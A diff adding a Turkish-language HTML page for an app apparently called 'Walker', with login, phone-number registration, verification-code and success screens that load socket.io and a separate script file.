@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Walker</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+
+  <div class="auth-wrapper">
+
+    <!-- LOGIN -->
+    <div class="auth-card" id="loginCard">
+      <h1>WALKER</h1>
+      <input type="text" id="username" placeholder="Kullanıcı Adı">
+      <input type="password" id="password" placeholder="Şifre">
+      <button id="loginSubmit">Giriş Yap</button>
+      <div class="divider">veya</div>
+      <button class="secondary" type="button" onclick="showRegister()">Kayıt Ol</button>
+    </div>
+
+    <!-- REGISTER -->
+    <div class="auth-card hidden" id="registerCard">
+      <h1>KAYIT</h1>
+      <input type="tel" id="registerPhone" placeholder="05XXXXXXXXX" maxlength="11" />
+      <button id="registerSubmit" type="button">Devam Et</button>
+      <button class="secondary" type="button" onclick="showLogin()">Giriş Yap</button>
+    </div>
+
+    <!-- VERIFY -->
+    <div class="auth-card hidden" id="verifyCard">
+      <h1>DOĞRULAMA</h1>
+      <input id="verifyCode" type="text" placeholder="Kod">
+      <button id="verifySubmit" type="button">Gönder</button>
+    </div>
+
+    <!-- SUCCESS -->
+    <div class="auth-card hidden" id="successScreen">
+      <h1>SUCCESS</h1>
+      <div class="spinner"></div>
+    </div>
+
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="script.js"></script>
+
+</body>
+</html>
